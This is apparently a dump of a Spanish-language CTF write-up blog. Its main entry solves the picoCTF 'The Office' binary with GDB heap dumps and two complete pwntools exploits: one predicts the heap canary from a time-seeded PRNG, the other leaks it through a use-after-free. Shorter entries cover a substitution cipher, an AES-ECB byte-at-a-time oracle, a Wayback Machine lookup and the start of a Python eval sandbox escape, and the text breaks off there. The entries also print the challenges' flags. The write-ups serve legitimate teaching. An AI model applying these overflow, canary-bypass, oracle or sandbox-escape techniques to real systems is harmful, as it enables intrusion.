(y/n)? \"); iVar1 = __isoc99_scanf(\"%c\", \u0026amp;local_9d); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); if ((local_9d != 'n') \u0026amp;\u0026amp; (local_9d != 'N')) { printf(\"Bldg #: \"); iVar1 = __isoc99_scanf(\"%u\", local_9c + 0x24); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); } putchar(10); if (local_10 != *(int *) (in_GS_OFFSET + 0x14)) { local_9c = (char *) FUN_08049bd0(); } return local_9c; }  En el código, se observa que no podemos crear un usuario que se llame admin. Además, vemos que el campo Phone # es vulnerable a Buffer Overflow, porque no se limita el número de caracteres que podemos introducir:\nprintf(\"Phone #: \"); iVar1 = __isoc99_scanf(\"%s\", local_9c + 0x18);  Podemos tratar de desbordarlo:\n$ ./the_office 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: asdf Email (y/n)? n Salary: 1234 Phone #: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Bldg (y/n)? n *** heap smashing detected ***: ./the_office terminated  Como hay un canario protegiendo los ataques de heap overflow. Vamos a utilizar GDB para ver cómo se gestiona el heap:\n$ gdb -q the_office Reading symbols from the_office... (No debugging symbols found in the_office) gef➤ break puts Breakpoint 1 at 0x8048600 gef➤ run Starting program: ./the_office Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: AAAA Email (y/n)? n Salary: 255 Phone #: BBBB Bldg (y/n)? n Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  Para encontrar las direcciones del heap, podemos buscar por AAAA, que es el nombre que le hemos puesto al trabajador:\ngef➤ grep AAAA [+] Searching 'AAAA' in memory [+] In (0xf7ffb000-0xf7ffc000), permission=rw- 0xf7ffb00c - 0xf7ffb010 → \"AAAA\" gef➤ x/32x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000fb4 0x00000035 0x00000000 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000  Y aquí vemos que está el canario. Para evitarlo, necesitamos fugarlo o calcularlo antes de explotar la vulnerabilidad de Buffer Overflow. Entonces, podremos utilizar el desbordamiento para modificar el nombre del siguiente empleado y poner admin.\nComo se trata de un canario personalizado, podemos descubrir cómo se genera. De hecho, hay una función en el binario que muestra información de depuración del heap, pero está deshabilitada. Sin embargo, tenemos el código fuente descompilado:\nundefined4 FUN_08049240() { undefined4 uVar1; uint __seed; if (DAT_0804c070 == (void *) 0x0) { DAT_0804c074 = mmap((void *) 0x0, 0x1000, 3, 0x22, -1, 0); if ((DAT_0804c074 == (void *) 0xffffffff) || (DAT_0804c074 == (void *) 0x0)) { puts(\"Memory Error :(\"); uVar1 = 0; } else { __seed = time((time_t *) 0x0); srand(__seed); DAT_0804c06c = rand(); DAT_0804c078 = (int) DAT_0804c074 + 0x1000; DAT_0804c070 = DAT_0804c074; FUN_080491f0(DAT_0804c074, 0x1000 - DAT_0804c060, 0, 0, 1); uVar1 = 1; } } else { uVar1 = 1; } return uVar1; }  Está utilizando srand para configurar una semilla basada en tiempo y rand para generar el valor del canario mediante un Generador de Números Pseudo Aleatorios (PRNG). Esta parte es similar al reto seed-sPRiNG.\nPodemos utilizar este código en C para generar un número aleatorio utilizando el método anterior:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main(int argc, char** argv) { time_t t = time(0); if (argc == 2) { t += atoi(argv[1]); } else { exit(1); } srand(t); printf(\"%d\\n\", rand()); return 0; }  Este código lo compilamos y lo ejecutamos de la siguiente manera:\n$ gcc -o canary canary.c $ ./canary 0 1073673904 $ ./canary 1 156048449  El número que se pasa como argumento es solamente un offset por si la instancia remota no está sincronizada con nuestra máquina.\nVamos a crear otro usuario utilizando GDB y así visualizar la estrategia:\ngef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: CCCC Email (y/n)? n Salary: 127 Phone #: DDDD Bldg (y/n)? n Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000035 0x00000035 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1a3e675e 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  Si eliminamos el primer usuario, vemos que los datos no son borrados:\ngef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 2 Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ continue Continuing. Employee #? 0 Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000034 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000035 0x00000034 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1a3e675e 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  La única diferencia con el heap anterior es que hay algunos 0x34 en lugar de 0x35 (lo cual significa que el chunk ya no está en uso, no está reservado). La funcionalidad trata de imitar a free, ya que al crear otro empleado, se sobrescribe el chunk liberado:\ngef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: EEEE Email (y/n)? n Salary: 65535 Phone #: FFFF Bldg (y/n)? n Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000035 0x00000001 0x45454545 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x0000ffff 0x46464646 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000035 0x00000035 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1a3e675e 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  En este punto, podríamos haber explotado la vulnerabilidad de Buffer Overflow (sobrescribiendo el canario con el mismo valor) para modificar el nombre del segundo usuario.\nPara automatizarlo, podemos utilizar el siguiente exploit escrito en Python con pwntools:\n#!/usr/bin/env python3 from pwn import context, log, p32, process, remote, sys context.binary = 'the_office' elf = context.binary def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def compute_canary(offset): with context.local(log_level='CRITICAL'): canary_process = process(['canary', str(offset)]) canary = int(canary_process.recvline().decode()) canary_process.close() return canary def add_employee(p, name=b'a', salary=b'1', phone=b'b'): p.sendlineafter(b'token', b'1') p.sendlineafter(b'Name: ', name) p.sendlineafter(b'Email (y/n)? ', b'n') p.sendlineafter(b'Salary: ', salary) p.sendlineafter(b'Phone #: ', phone) p.sendlineafter(b'Bldg (y/n)? ', b'n') def main(): offset = 0 while True: log.info(f'Testing offset: {offset}') p = get_process() canary = compute_canary(offset) log.info(f'Computed heap canary: {hex(canary)}') add_employee(p) add_employee(p) p.sendlineafter(b'token', b'2') p.sendlineafter(b'Employee #?\\n', b'0') add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin') try: p.sendlineafter(b'token', b'4') except EOFError: offset += 1 continue p.sendlineafter(b'Employee #?\\n', b'1') break log.success(f'Flag: {p.recvline().decode()}') p.close() if __name__ == '__main__': main()  Nótese que el payload malicioso consiste en 28 caracteres para llegar a la posición del canario, luego el valor aleatorio generado para sobrescribirlo (utilizando el código en C anterior), luego dos 0x00000035 para mantener los metadatos del chunk y después ponemos admin para el nombre del segundo empleado. Una vez aquí, ya podemos tomar el token de acceso (la flag).\nVamos a probarlo en local:\n$ echo THISISTHEFLAG  flag.txt $ python3 solve.py [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [*] Testing offset: 0 [+] Starting local process './the_office': pid 2018360 [*] Computed heap canary: 0x25399862 [+] Flag: THISISTHEFLAG [*] Process './the_office' stopped with exit code 0 (pid 2018360)  Ahora podemos probarlo en la instancia remota y obtener la flag:\n$ python3 solve.py mercury.picoctf.net 24751 [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [*] Testing offset: 0 [+] Opening connection to mercury.picoctf.net on port 24751: Done [*] Computed heap canary: 0xd83ff5c [*] Testing offset: 1 [+] Opening connection to mercury.picoctf.net on port 24751: Done [*] Computed heap canary: 0x4db603e [+] Flag: picoCTF{cb3b0507a278ae12d2465d4c8ee30f31} [*] Closed connection to mercury.picoctf.net port 24751 [*] Closed connection to mercury.picoctf.net port 2475  Perfecto, tenemos la flag. Pero ahora, vamos a resolver el reto de otra manera: fugando el valor del canario.\nAntes vimos que podemos añadir empleados indicando un email y un edificio (Bldg) si aplica. Vamos a reiniciar GDB y añadir cuatro usuarios (todas las combinaciones).\n$ gdb -q the_office Reading symbols from the_office... (No debugging symbols found in the_office) gef➤ run Starting program: ./the_office 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: AAAA Email (y/n)? n Salary: 15 Phone #: BBBB Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: CCCC Email (y/n)? n Salary: 127 Phone #: DDDD Bldg (y/n)? y Bldg #: 1 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: EEEE Email (y/n)? y Email address: aaaa Salary: 255 Phone #: FFFF Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: GGGG Email (y/n)? y Email address: bbbb Salary: 65535 Phone #: HHHH Bldg (y/n)? y Bldg #: 2 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  Ahora podemos comprobar el heap:\ngef➤ grep AAAA [+] Searching 'AAAA' in memory [+] In (0xf7ffb000-0xf7ffc000), permission=rw- 0xf7ffb00c - 0xf7ffb010 → \"AAAA\" gef➤ x/100x 0xf7ffb000 0xf7ffb000: 0x1c180451 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x0000000f 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1c180451 0x00000035 0x00000035 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000001 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1c180451 0x00000035 0x00000035 0x45454545 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0xf7ffb0cc 0xf7ffb0a0: 0x000000ff 0x46464646 0x00000000 0x00000000 0xf7ffb0b0: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb0c0: 0x1c180451 0x00000015 0x00000035 0x61616161 0xf7ffb0d0: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb0e0: 0x1c180451 0x00000035 0x00000015 0x47474747 0xf7ffb0f0: 0x00000000 0x00000000 0x00000000 0xf7ffb12c 0xf7ffb100: 0x0000ffff 0x48484848 0x00000000 0x00000000 0xf7ffb110: 0x00000002 0x00000000 0x00000000 0x00000000 0xf7ffb120: 0x1c180451 0x00000015 0x00000035 0x62626262 0xf7ffb130: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb140: 0x1c180451 0x00000eb4 0x00000015 0x00000000 0xf7ffb150: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb160: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb170: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb180: 0x00000000 0x00000000 0x00000000 0x00000000  Como se ve, el campo de email se guarda como un puntero a otro chunk. Si aumentamos la longitud del email, podemos obtener un chunk tal que se ponga el valor del canario en la posición donde estaría el número de edificio en un chunk de empleado (por ejemplo, entre 20 y 35 caracteres):\n$ gdb -q the_office Reading symbols from the_office... (No debugging symbols found in the_office) gef➤ run Starting program: ./the_office 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: AAAA Email (y/n)? y Email address: aaaaaaaaaaaaaaaaaaaaaaaa Salary: 255 Phone #: BBBB Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  Este es el heap:\ngef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x73550262 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0xf7ffb04c 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x73550262 0x00000025 0x00000035 0x61616161 0xf7ffb050: 0x61616161 0x61616161 0x61616161 0x61616161 0xf7ffb060: 0x61616161 0x00000000 0x00000000 0x00000000 0xf7ffb070: 0x73550262 0x00000f84 0x00000025 0x00000000 0xf7ffb080: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  Ahora la idea es liberar el empleado y crear dos empleados, pero sin email:\ngef➤ continue Continuing. 2 Employee #? 0 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: CCCC Email (y/n)? n Salary: 127 Phone #: DDDD Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 3 Employee 0: Name: CCCC Email: Salary: 127 Bldg #: 0 Phone #: DDDD 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: EEEE Email (y/n)? n Salary: 15 Phone #: FFFF Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  Ahora, hemos sobrescrito algunos de los valores del heap. En concreto, el segundo usuario está posicionado donde estaba el email del primer usuario creado:\ngef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x73550262 0x00000035 0x00000001 0x43434343 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x73550262 0x00000035 0x00000035 0x45454545 0xf7ffb050: 0x61616100 0x61616161 0x61616161 0x00000000 0xf7ffb060: 0x0000000f 0x46464646 0x00000000 0x00000000 0xf7ffb070: 0x73550262 0x00000f84 0x00000025 0x00000000 0xf7ffb080: 0x73550262 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  Y ahora vemos que el segundo empleado tiene el valor del canario en la posición del número de edificio (Bldg). Por tanto, podemos listar los empleados y fugar su valor:\ngef➤ continue Continuing. 3 Employee 0: Name: CCCC Email: Salary: 127 Bldg #: 0 Phone #: DDDD Employee 1: Name: EEEE Email: Salary: 15 Bldg #: 1934951010 Phone #: FFFF  Y aquí lo tenemos:\n$ python3 -c 'print(hex(1934951010))' 0x73550262  Lo que ha pasado es parecido a una vulnerabilidad de Use After Free.\nAhora, el proceso de exlpotación es igual que el de antes, pero en logar de calcular el valor del canario mediante PRNG, lo fugamos. El exploit de Python que resuelve el reto de esta manera es este:\n#!/usr/bin/env python3 from pwn import context, log, p32, process, remote, sys context.binary = 'the_office' elf = context.binary def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def add_employee(p, name=b'a', email=None, salary=b'1', phone=b'b'): p.sendlineafter(b'token', b'1') p.sendlineafter(b'Name: ', name) if email: p.sendlineafter(b'Email (y/n)? ', b'y') p.sendlineafter(b'Email address: ', email) else: p.sendlineafter(b'Email (y/n)? ', b'n') p.sendlineafter(b'Salary: ', salary) p.sendlineafter(b'Phone #: ', phone) p.sendlineafter(b'Bldg (y/n)? ', b'n') def main(): p = get_process() add_employee(p, email=b'A' * 24) p.sendlineafter(b'token', b'2') p.sendlineafter(b'Employee #?\\n', b'0') add_employee(p) add_employee(p) p.sendlineafter(b'token', b'3') p.recvuntil(b'Bldg #: ') p.recvuntil(b'Bldg #: ') canary = int(p.recvline().strip().decode()) log.info(f'Leaked heap canary: {hex(canary)}') p.sendlineafter(b'token', b'2') p.sendlineafter(b'Employee #?\\n', b'0') add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin') p.sendlineafter(b'token', b'4') p.sendlineafter(b'Employee #?\\n', b'1') log.success(f'Flag: {p.recvline().decode()}') p.close() if __name__ == '__main__': main()  Y funciona tanto en local como en remoto:\n$ echo THISISTHEFLAG  flag.txt $ python3 solve2.py [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './the_office': pid 2081382 [*] Leaked heap canary: 0x5c3b7895 [*] Process './the_office' stopped with exit code 0 (pid 2081382) [+] Flag: THISISTHEFLAG  $ python3 solve2.py mercury.picoctf.net 24751 [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to mercury.picoctf.net on port 24751: Done [*] Leaked heap canary: 0x29df8536 [+] Flag: picoCTF{cb3b0507a278ae12d2465d4c8ee30f31} [*] Closed connection to mercury.picoctf.net port 24751  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/the-office/","section":"ctf","summary":"picoCTF 2021. 400 puntos. Binario de 32 bits. Explotación del heap. Heap overflow. PRNG. Use After Free","time":14,"title":"The Office"},{"contents":"Se nos proporciona una imagen con unos símbolos raros:\nEl nombre del reto es una pista, ya que se está utilizando el cifrado de la reina María de Escocia. El cifrado se basa en la sustitución de letras por símbolos utilizando el siguiente alfabeto:\nSi traducimos cada símbolo de la imagen a una letra, obtenemos la flag: HTB{THEBABINGTONPLOT}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/the-secret-of-a-queen/","section":"ctf","summary":"Cifrado de la reina","time":0,"title":"The secret of a Queen"},{"contents":"Se nos proporciona el siguiente código en Python:\nfromCrypto.CipherimportAES fromCrypto.Util.Paddingimportpad importrandom importsignal importsubprocess importsocketserver FLAG=b'HTB{--REDACTED--}' prefix=random.randbytes(12) key=random.randbytes(16) defencrypt(key, msg): msg=bytes.fromhex(msg) crypto=AES.new(key, AES.MODE_ECB) padded=pad(prefix+msg+FLAG, 16) returncrypto.encrypt(padded).hex() defchallenge(req): req.sendall(b'Welcome to Klaus\\'s crypto lab.\\n'+ b'It seems like there is a prefix appended to the real firmware\\n'+ b'Can you somehow extract the firmware and fix the chip?\\n') whileTrue: req.sendall(b'\u0026gt; ') try: msg=req.recv(4096).decode() ct=encrypt(key, msg) req.sendall(ct.encode() +b'\\n') exceptExceptionase: print(e) req.sendall(b'An error occurred! Please try again!') classincoming(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(1500) req=self.request challenge(req) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defmain(): socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() if__name__==\"__main__\": main()  Básicamente, tenemos la oportunidad de enviar un mensaje que será cifrado usando AES ECB de una manera particular:\nFLAG=b'HTB{--REDACTED--}' prefix=random.randbytes(12) key=random.randbytes(16) defencrypt(key, msg): msg=bytes.fromhex(msg) crypto=AES.new(key, AES.MODE_ECB) padded=pad(prefix+msg+FLAG, 16) returncrypto.encrypt(padded).hex()  A nuestro mensaje se le aádirá un prefijo aleatorio de 12 bytes (prefix) y la flag (FLAG) como sufijo antes de cifrar. El problema es que se utiliza AES ECB:\nPor tanto, el texto claro se divide en bloques de 16 bytes y luego cada bloque se cifra de forma independiente. Para obtener la flag tenemos un oráculo. Por ejemplo, podemos introducir 15 caracteres A, luego un carácter de prueba y otros 15 caracteres A. Cuando la salida de los dos bloques cifrados coincida, sabremos que el carácter de prueba es el primer carácter de la flag.\nVamos a verlo gráficamente:\nOur input: \"BBBBAAAAAAAAAAAAAAAxAAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAAAAx AAAAAAAAAAAAAAA? ???????????????? Ciphertext Blocks: R X Y Z  Estaremos iterando sobre todos los caracteres y probandolos en la posición de la x. Miraremos los bloques cifrados resultantes hasta que X = Y; en este punto, sabremos que los dos bloques en texto claro son iguales, por lo que el carácterprobado es correcto.\nLuego, seguimos el proceso así:\nOur input: \"BBBBAAAAAAAAAAAAAAHxAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAAAHx AAAAAAAAAAAAAAH? ???????????????? Ciphertext Blocks: R X Y Z  Our input: \"BBBBAAAAAAAAAAAAAHTxAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAAHTx AAAAAAAAAAAAAHT? ???????????????? Ciphertext Blocks: R X Y Z  Our input: \"BBBBAAAAAAAAAAAAHTBxAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAHTBx AAAAAAAAAAAAHTB? ???????????????? Ciphertext Blocks: R X Y Z  Our input: \"BBBBAAAAAAAAAAAHTB{xAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAHTB{x AAAAAAAAAAAHTB{? ???????????????? Ciphertext Blocks: R X Y Z  Habrá una situación en la que no podremos poner más caracteres A de relleno. Vamos a asumir que la flag es HTB{f4k3_fl4g_f0r_t3st1ng}. Este problema llegará después de esta iteración:\nOur input: \"BBBBHTB{f4k3_f0r_t3x\" Plaintext Blocks: rrrrrrrrrrrrBBBB HTB{f4k3_f0r_t3x HTB{f4k3_f0r_t3? ???????????????? Ciphertext Blocks: R X Y Z  Pero es fácil de corregir, solamente tenemos que seguir desplazando el payload:\nOur input: \"BBBBTB{f4k3_f0r_t3sxAAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB TB{f4k3_f0r_t3sx AAAAAAAAAAAAAAAH TB{f4k3_f0r_t3s? ???????????????? Ciphertext Blocks: R X Y Z W  Ahora estaremos mirando los bloques X y Z. Y procedemos así:\nOur input: \"BBBBB{f4k3_f0r_t3stxAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB B{f4k3_f0r_t3stx AAAAAAAAAAAAAAHT B{f4k3_f0r_t3st? ???????????????? Ciphertext Blocks: R X Y Z W  Our input: \"BBBB{f4k3_f0r_t3st1xAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB {f4k3_f0r_t3st1x AAAAAAAAAAAAAHTB {f4k3_f0r_t3st1? ???????????????? Ciphertext Blocks: R X Y Z W  Our input: \"BBBBf4k3_f0r_t3st1nxAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB f4k3_f0r_t3st1nx AAAAAAAAAAAAHTB{ f4k3_f0r_t3st1n? ???????????????? Ciphertext Blocks: R X Y Z W  Our input: \"BBBB4k3_f0r_t3st1ngxAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB 4k3_f0r_t3st1ngx AAAAAAAAAAAHTB{f 4k3_f0r_t3st1ng? ???????????????? Ciphertext Blocks: R X Y Z W  El proceso terminaría aquí, porque el carácter correcto sería }, que marca el final de la flag. Ahora tenemos que automatizar el proceso en Python e interactuar con el servidor para obtener los caracteres correctos y construir la flag:\n$ python3 solve.py 64.227.37.154:30799 [+] Opening connection to 64.227.37.154 on port 30799: Done [◓] Flag: HTB{7h3_br0k3n_0r@c1e!!!} [*] Closed connection to 64.227.37.154 port 30799  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/the-three-eyed-oracle/","section":"ctf","summary":"Oráculo AES ECB","time":2,"title":"The Three-Eyed Oracle"},{"contents":"En este reto, nos piden encontrar una dirección de email que se mostró en la página web de la NASA (nasa.gov) el 31 de diciembre de 1996.\nLa manera de encontrar algo en una fecha concreta es recurrir a web.archive.org (WayBack Machine):\nAquí podemos buscar por nasa.gov y obtener un montón de snapshots de la página web. Curiosamente, la más antigua es del 31 de diciembre de 1996:\nSi vamos a ese snapshot, veremos alguna información. Y aquí tenemos el email:\nPor tanto, la flag es CTFlearn{today@nasa.gov}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/ctflearn/miscellaneous/time-traveller/","section":"ctf","summary":"WayBack Machine","time":0,"title":"Time Traveller"},{"contents":"Se nos proporciona el código Python que está ejecutando la instancia remota (util.py):\n#!/usr/bin/env python3.10 importast importmath fromtypingimportUnion defis_expression_safe(node: Union[ast.Expression, ast.AST]) -\u0026gt; bool: matchtype(node): caseast.Constant: returnTrue caseast.List|ast.Tuple|ast.Set: returnis_sequence_safe(node) caseast.Dict: returnis_dict_safe(node) caseast.Name: returnnode.id ==\"math\"andisinstance(node.ctx, ast.Load) caseast.UnaryOp: returnis_expression_safe(node.operand) caseast.BinOp: returnis_expression_safe(node.left) andis_expression_safe(node.right) caseast.Call: returnis_call_safe(node) caseast.Attribute: returnis_expression_safe(node.value) case_: returnFalse defis_sequence_safe(node: Union[ast.List, ast.Tuple, ast.Set]): returnall(map(is_expression_safe, node.elts)) defis_dict_safe(node: ast.Dict) -\u0026gt; bool: fork, vinzip(node.keys, node.values): ifnotis_expression_safe(k) andis_expression_safe(v): returnFalse returnTrue defis_call_safe(node: ast.Call) -\u0026gt; bool: ifnotis_expression_safe(node.func): returnFalse ifnotall(map(is_expression_safe, node.args)): returnFalse ifnode.keywords: returnFalse returnTrue defis_safe(expr: str) -\u0026gt; bool: forbadin['_']: ifbadinexpr: # Just in case! returnFalse returnis_expression_safe(ast.parse(expr, mode='eval').body) if__name__==\"__main__\": print(\"Welcome to SafetyCalc (tm)!\\n\" \"Note: SafetyCorp are not liable for any accidentsthat may occur while using SafetyCalc\") whileTrue: ex=input(\"\u0026gt; \") ifis_safe(ex): try: print(eval(ex, {'math': math, '__builtins__': {}, 'getattr': getattr}, {})) exceptExceptionase: print(f\"Something bad happened! {e}\") else: print(\"Unsafe command detected! The snake approaches...\") exit(-1)  Básicamente, tenemos que introducir unos datos de entrada (ex) y, si se consideran seguros (is_safe), se pasan a eval. Sin embargo, solamente tenemos el módulo math, la función getattr y ninguna función built-in. El objetivo de este reto es conseguir ejecutar código Python de alguna manera para leer la flag del sistema de archivos.\nPodemos ver lo que hace getattr:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; help(getattr) Help on built-in function getattr in module builtins: getattr(...) getattr(object, name[, default]) -\u0026gt; value Get a named attribute from an object; getattr(x, 'y') is equivalent to x.y. When a default argument is given, it is returned when the attribute doesn't exist; without it, an exception is raised in that case.  La función is_safe mira si nuestro payload contiene guiones bajos (_). Si no, verifica el Abstract Symbol Tree (AST). Existen algunas funciones involucradas con la validación del AST. En resumen:\n Las constante están permitidas list, tuple y set están permitidos siempre que sus contenidos estén permitidos (is_sequence_safe) dict está permitido siempre que sus claves y sus valore estén permitidos (is_dict_safe) Las funciones son seguras siempre que pertenezcan al módulo math  En verdad, hay un error en is_dict_safe (sí, el resumen anterior está mal):\ndefis_dict_safe(node: ast.Dict) -\u0026gt; bool: fork, vinzip(node.keys, node.values): ifnotis_expression_safe(k) andis_expression_safe(v): returnFalse returnTrue  De hecho, dict es seguro si la clave es segura, el valor da igual. Vamos a probarlo:\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: 